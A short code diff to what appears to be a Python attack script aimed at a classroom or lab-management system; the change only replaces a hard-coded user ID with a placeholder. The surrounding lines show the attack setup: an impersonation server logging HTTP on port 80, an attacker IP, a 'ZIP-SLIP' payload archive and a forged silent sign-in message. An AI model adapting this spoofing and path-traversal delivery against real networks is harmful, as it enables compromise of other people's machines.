@@ -22,7 +22,7 @@ WSLOG = os.path.join(WSDIR, "ws8889.log")
 SPOOFLOG = os.path.join(WSDIR, "npcap_http80.log")
 OUR = "192.168.137.1"
 ROOM = "UXHOVJJF"
-UID = "2112229"
+UID = "<USER_ID>"
 PAYLOAD = "lab2.7z"   # 冒充器 /lab2.7z -> payload_proxy.7z (ZIP-SLIP)
 
 
@@ -96,7 +96,7 @@ def main():
     sign = {
         "attendClass": 2, "setClassTime": True, "signType": 1,
         "classroomId": ROOM, "roomId": "LAB_ROOM1",
-        "taskId": "LAB_T9", "userId": 2112229, "desktopId": "LAB_D9",
+        "taskId": "LAB_T9", "userId": <USER_ID>, "desktopId": "LAB_D9",
         "isPlay": 0, "isSilent": 1, "isSignFinish": 1,
         "isTeaStartSignTask": 1, "openAdvanceSignOut": 0, "classMode": 0,
         "childTaskId": {},
